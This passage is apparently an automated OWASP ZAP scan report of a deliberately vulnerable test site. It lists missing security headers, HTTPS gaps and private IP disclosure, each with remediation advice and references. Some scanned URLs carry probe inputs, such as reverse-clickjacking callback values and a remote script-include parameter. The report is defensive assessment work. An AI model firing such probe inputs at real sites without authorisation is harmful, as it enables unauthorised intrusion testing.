  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO/%3Fq=%2526callback%253Dfoo%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO/?q=%26callback%3Dfoo%23`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithoutXFO/?q=%26callback%3Dfoo%23`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO/%3Fq=%2526callback%253Dfoo%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO/?q=%26callback%3Dfoo%23`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/multipage/ParameterInQuery/OtherParameter/WithXFO/?q=%26callback%3Dfoo%23`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/InCallback
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/InCallback`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/InCallback`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/OtherParameter
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/OtherParameter`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInFragment/OtherParameter`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback/%3Fq=urc_button.click
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback/?q=urc_button.click`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/InCallback/?q=urc_button.click`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter`
* URL: https://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter/%3Fq=%2526callback%253Durc_button.click%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter/?q=%26callback%3Durc_button.click%23`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reverseclickjacking/singlepage/ParameterInQuery/OtherParameter/?q=%26callback%3Durc_button.click%23`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/hsts_includesubdomains_missing
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/hsts_includesubdomains_missing`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/hsts_includesubdomains_missing`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_missing
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_missing`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_missing`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_too_low
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_too_low`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/hsts_max_age_too_low`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/hsts_missing
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/hsts_missing`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/hsts_missing`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/hsts_preload_missing
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/hsts_preload_missing`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/hsts_preload_missing`
* URL: https://public-firing-range.appspot.com/stricttransportsecurity/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/stricttransportsecurity/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/stricttransportsecurity/index.html`
* URL: https://public-firing-range.appspot.com/tags
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/tags`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/tags`
* URL: https://public-firing-range.appspot.com/tags/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/tags/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/tags/index.html`
* URL: https://public-firing-range.appspot.com/tags/multiline%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/tags/multiline?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/tags/multiline?q=a`
* URL: https://public-firing-range.appspot.com/urldom
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom`
* URL: https://public-firing-range.appspot.com/urldom/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/index.html`
* URL: https://public-firing-range.appspot.com/urldom/jsonp%3Fcallback=foobar
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/jsonp?callback=foobar`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/jsonp?callback=foobar`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/a.href
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/a.href`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/a.href`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/base.href
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/base.href`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/base.href`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/document.location
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/document.location`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/document.location`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/embed.src
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/embed.src`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/embed.src`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/fetch
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/fetch`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/fetch`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/form.action
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/form.action`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/form.action`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/iframe.src
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/iframe.src`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/iframe.src`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/input.formaction
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/input.formaction`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/input.formaction`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/link.href
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/link.href`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/link.href`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/object.data
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/object.data`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/object.data`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/param.code.value
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/param.code.value`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/param.code.value`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/param.movie.value
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/param.movie.value`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/param.movie.value`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/param.src.value
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/param.src.value`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/param.src.value`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/param.url.value
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/param.url.value`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/param.url.value`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/script.href
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/script.href`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/script.href`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/script.src
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/script.src`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/script.src`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_domain
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_domain`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_domain`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_path
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_path`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_path`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_query
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_query`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/script.src.partial_query`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/window.open
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/window.open`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/window.open`
* URL: https://public-firing-range.appspot.com/urldom/location/hash/xhr.open
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/hash/xhr.open`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/hash/xhr.open`
* URL: https://public-firing-range.appspot.com/urldom/location/search/area.href%3F//example.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/search/area.href?//example.org`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/search/area.href?//example.org`
* URL: https://public-firing-range.appspot.com/urldom/location/search/button.formaction%3F//example.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/search/button.formaction?//example.org`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/search/button.formaction?//example.org`
* URL: https://public-firing-range.appspot.com/urldom/location/search/frame.src%3F//example.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/search/frame.src?//example.org`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/search/frame.src?//example.org`
* URL: https://public-firing-range.appspot.com/urldom/location/search/location.assign%3F//example.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/search/location.assign?//example.org`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/search/location.assign?//example.org`
* URL: https://public-firing-range.appspot.com/urldom/location/search/svg.a%3F//example.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/urldom/location/search/svg.a?//example.org`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/urldom/location/search/svg.a?//example.org`
* URL: https://public-firing-range.appspot.com/vulnerablelibraries
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/vulnerablelibraries`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/vulnerablelibraries`
* URL: https://public-firing-range.appspot.com/vulnerablelibraries/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/vulnerablelibraries/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/vulnerablelibraries/index.html`
* URL: https://public-firing-range.appspot.com/vulnerablelibraries/jquery.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/vulnerablelibraries/jquery.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/vulnerablelibraries/jquery.html`
* URL: https://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/angular/angular_body_raw_post/1.6.0`
* URL: https://public-firing-range.appspot.com/reflected/parameter/form
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/reflected/parameter/form`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/reflected/parameter/form`

Instances: 317

### Solution

Ensure that your web server, application server, load balancer, etc. is configured to only serve such content via HTTPS. Consider implementing HTTP Strict Transport Security.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)
* [ https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security ](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
* [ https://caniuse.com/stricttransportsecurity ](https://caniuse.com/stricttransportsecurity)
* [ https://datatracker.ietf.org/doc/html/rfc6797 ](https://datatracker.ietf.org/doc/html/rfc6797)


#### CWE Id: [ 311 ](https://cwe.mitre.org/data/definitions/311.html)


#### WASC Id: 4

#### Source ID: 1

### [ Permissions Policy Header Not Set ](https://www.zaproxy.org/docs/alerts/10063/)



##### Low (Medium)

### Description

Permissions Policy Header is an added layer of security that helps to restrict from unauthorized access or usage of browser/client features by web resources. This policy ensures the user privacy by limiting or specifying the features of the browsers can be used by the web resources. Permissions Policy provides a set of standard HTTP headers that allow website owners to limit which features of browsers can be used by the page such as camera, microphone, location, full screen etc.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/sitemap.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 11

### Solution

Ensure that your web server, application server, load balancer, etc. is configured to set the Permissions-Policy header.

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy)
* [ https://developer.chrome.com/blog/feature-policy/ ](https://developer.chrome.com/blog/feature-policy/)
* [ https://scotthelme.co.uk/a-new-security-header-feature-policy/ ](https://scotthelme.co.uk/a-new-security-header-feature-policy/)
* [ https://w3c.github.io/webappsec-feature-policy/ ](https://w3c.github.io/webappsec-feature-policy/)
* [ https://www.smashingmagazine.com/2018/12/feature-policy/ ](https://www.smashingmagazine.com/2018/12/feature-policy/)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ Private IP Disclosure ](https://www.zaproxy.org/docs/alerts/2/)



##### Low (Medium)

### Description

A private IP (such as 10.x.x.x, 172.x.x.x, 192.168.x.x) or an Amazon EC2 private hostname (for example, ip-10-0-56-78) has been found in the HTTP response body. This information might be helpful for further attacks targeting internal systems.

* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `192.168.1.2`
  * Other Info: `192.168.1.2
192.168.1.2
`
* URL: https://public-firing-range.appspot.com/remoteinclude/parameter/script%3Fq=http://192.168.1.2/private_network_import.js
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `192.168.1.2`
  * Other Info: `192.168.1.2
`

Instances: 2

### Solution

Remove the private IP address from the HTTP response body.  For comments, use JSP/ASP/PHP comment instead of HTML/JavaScript comment which can be seen by client browsers.

### Reference


* [ https://tools.ietf.org/html/rfc1918 ](https://tools.ietf.org/html/rfc1918)


#### CWE Id: [ 200 ](https://cwe.mitre.org/data/definitions/200.html)


#### WASC Id: 13

#### Source ID: 3

### [ Strict-Transport-Security Header Not Set ](https://www.zaproxy.org/docs/alerts/10035/)



##### Low (High)

### Description

HTTP Strict Transport Security (HSTS) is a web security policy mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/robots.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://public-firing-range.appspot.com/sitemap.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 11

### Solution

Ensure that your web server, application server, load balancer, etc. is configured to enforce Strict-Transport-Security.

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html ](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)
* [ https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security ](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
* [ https://caniuse.com/stricttransportsecurity ](https://caniuse.com/stricttransportsecurity)
* [ https://datatracker.ietf.org/doc/html/rfc6797 ](https://datatracker.ietf.org/doc/html/rfc6797)


#### CWE Id: [ 319 ](https://cwe.mitre.org/data/definitions/319.html)


#### WASC Id: 15

#### Source ID: 3

### [ X-Content-Type-Options Header Missing ](https://www.zaproxy.org/docs/alerts/10021/)



##### Low (Medium)

### Description

The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

* URL: https://public-firing-range.appspot.com
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/address/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/angular/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/badscriptimport/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/clickjacking/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/cors/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/flashinjection/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/leakedcookie/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: https://public-firing-range.appspot.com/mixedcontent/index.html
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`

Instances: 11

### Solution

Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

### Reference


